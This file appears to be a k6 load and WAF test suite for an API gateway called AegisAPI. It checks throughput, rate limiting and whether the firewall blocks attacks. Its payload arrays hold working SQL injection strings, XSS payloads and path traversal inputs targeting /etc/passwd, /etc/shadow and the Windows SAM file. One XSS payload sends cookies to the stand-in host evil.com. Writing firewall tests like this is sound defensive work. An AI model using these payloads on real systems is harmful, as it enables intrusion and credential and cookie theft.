// ============================================================
// AegisAPI — K6 Stress Test Suite
// Tests throughput, rate limiting, and WAF detection
//
// Install: https://grafana.com/docs/k6/latest/set-up/install-k6/
// Run:     k6 run gateway/tests/stress-test.k6.js
// ============================================================

import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Trend } from 'k6/metrics';

// ── Custom Metrics ──────────────────────────────────────────
const blockedRate = new Rate('waf_blocked_rate');
const rateLimitedRate = new Rate('rate_limited_rate');
const cleanPassRate = new Rate('clean_pass_rate');
const responseTime = new Trend('aegis_response_time');

// ── Configuration ───────────────────────────────────────────
const BASE_URL = __ENV.GATEWAY_URL || 'http://localhost:5000';

// ── Test Scenarios ──────────────────────────────────────────
export const options = {
  scenarios: {
    // Scenario 1: Clean traffic throughput baseline
    throughput_baseline: {
      executor: 'constant-vus',
      vus: 200,
      duration: '30s',
      exec: 'cleanTraffic',
      tags: { scenario: 'baseline' },
    },

    // Scenario 2: Rate limit verification
    rate_limit_burst: {
      executor: 'per-vu-iterations',
      vus: 1,
      iterations: 150,
      exec: 'rateLimitBurst',
      startTime: '35s',
      tags: { scenario: 'ratelimit' },
    },

    // Scenario 3: WAF — SQL Injection detection
    waf_sqli: {
      executor: 'constant-vus',
      vus: 50,
      duration: '15s',
      exec: 'sqliAttack',
      startTime: '45s',
      tags: { scenario: 'waf_sqli' },
    },

    // Scenario 4: WAF — XSS detection
    waf_xss: {
      executor: 'constant-vus',
      vus: 50,
      duration: '15s',
      exec: 'xssAttack',
      startTime: '65s',
      tags: { scenario: 'waf_xss' },
    },

    // Scenario 5: WAF — Path traversal detection
    waf_path_traversal: {
      executor: 'constant-vus',
      vus: 50,
      duration: '15s',
      exec: 'pathTraversalAttack',
      startTime: '85s',
      tags: { scenario: 'waf_path' },
    },

    // Scenario 6: Mixed traffic (80% clean, 20% malicious)
    mixed_traffic: {
      executor: 'constant-vus',
      vus: 100,
      duration: '60s',
      exec: 'mixedTraffic',
      startTime: '105s',
      tags: { scenario: 'mixed' },
    },
  },

  thresholds: {
    // Baseline throughput: p95 under 50ms
    'http_req_duration{scenario:baseline}': ['p(95)<50'],

    // WAF should block >95% of attack payloads
    'waf_blocked_rate': ['rate>0.95'],

    // Clean traffic should pass >99%
    'clean_pass_rate': ['rate>0.99'],
  },
};

// ── Payload Libraries ───────────────────────────────────────

const SQLI_PAYLOADS = [
  "' OR '1'='1",
  "UNION SELECT username, password FROM users",
  "'; DROP TABLE users; --",
  "1; EXEC xp_cmdshell('dir')",
  "' UNION ALL SELECT NULL, NULL, NULL--",
  "admin'--",
  "1' AND 1=1 UNION SELECT NULL, table_name FROM information_schema.tables--",
  "' WAITFOR DELAY '0:0:5'--",
  "1; SELECT * FROM users WHERE 1=1",
  "'; INSERT INTO admin VALUES('hacked','hacked');--",
];

const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(document.cookie)',
  '<svg onload=alert(1)>',
  '<body onload=alert("XSS")>',
  '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
  '<iframe src="javascript:alert(1)">',
  '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
  '<div onmouseover="alert(1)">hover me</div>',
  "';alert(String.fromCharCode(88,83,83))//",
];

const PATH_TRAVERSAL_PAYLOADS = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/shadow',
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '../../../proc/self/environ',
  '..\\..\\..\\boot.ini',
  '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
];

// ── Helper Functions ────────────────────────────────────────

function randomItem(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function postJSON(path, body) {
  return http.post(`${BASE_URL}${path}`, JSON.stringify(body), {
    headers: { 'Content-Type': 'application/json' },
  });
}

// ── Scenario Functions ──────────────────────────────────────

export function cleanTraffic() {
  const res = http.get(`${BASE_URL}/api/test`);
  responseTime.add(res.timings.duration);
  const passed = check(res, {
    'clean request returns 200': (r) => r.status === 200,
  });
  cleanPassRate.add(passed);
  sleep(0.1);
}

export function rateLimitBurst() {
  const res = http.get(`${BASE_URL}/api/test`);
  responseTime.add(res.timings.duration);

  if (res.status === 429) {
    rateLimitedRate.add(true);
    check(res, {
      'rate limit returns 429': (r) => r.status === 429,
      'rate limit has error message': (r) => {
        const body = r.json();
        return body && body.error && body.error.includes('Rate Limit');
      },
    });
  } else {
    rateLimitedRate.add(false);
    check(res, {
      'under-limit returns 200': (r) => r.status === 200,
    });
  }
}

export function sqliAttack() {
  const payload = randomItem(SQLI_PAYLOADS);
  const res = postJSON('/api/test', { query: payload });
  responseTime.add(res.timings.duration);

  const blocked = check(res, {
    'SQLi blocked with 403': (r) => r.status === 403,
    'SQLi response has violation type': (r) => {
      const body = r.json();
      return body && body.violation === 'SQLI';
    },
  });
  blockedRate.add(blocked);
  sleep(0.05);
}

export function xssAttack() {
  const payload = randomItem(XSS_PAYLOADS);
  const res = postJSON('/api/test', { content: payload });
  responseTime.add(res.timings.duration);

  const blocked = check(res, {
    'XSS blocked with 403': (r) => r.status === 403,
  });
  blockedRate.add(blocked);
  sleep(0.05);
}

export function pathTraversalAttack() {
  const payload = randomItem(PATH_TRAVERSAL_PAYLOADS);
  const res = http.get(`${BASE_URL}/api/test?file=${encodeURIComponent(payload)}`);
  responseTime.add(res.timings.duration);

  const blocked = check(res, {
    'Path traversal blocked with 403': (r) => r.status === 403,
  });
  blockedRate.add(blocked);
  sleep(0.05);
}

export function mixedTraffic() {
  const isMalicious = Math.random() < 0.2;

  if (isMalicious) {
    const attackType = Math.floor(Math.random() * 3);
    let res;

    switch (attackType) {
      case 0:
        res = postJSON('/api/test', { q: randomItem(SQLI_PAYLOADS) });
        break;
      case 1:
        res = postJSON('/api/test', { q: randomItem(XSS_PAYLOADS) });
        break;
      case 2:
        res = http.get(`${BASE_URL}/api/test?file=${encodeURIComponent(randomItem(PATH_TRAVERSAL_PAYLOADS))}`);
        break;
    }

    responseTime.add(res.timings.duration);
    check(res, {
      'malicious request blocked': (r) => r.status === 403,
    });
    blockedRate.add(res.status === 403);
  } else {
    const res = http.get(`${BASE_URL}/api/test`);
    responseTime.add(res.timings.duration);
    const passed = res.status === 200;
    check(res, {
      'clean request passes': (r) => r.status === 200,
    });
    cleanPassRate.add(passed);
  }

  sleep(0.05);
}
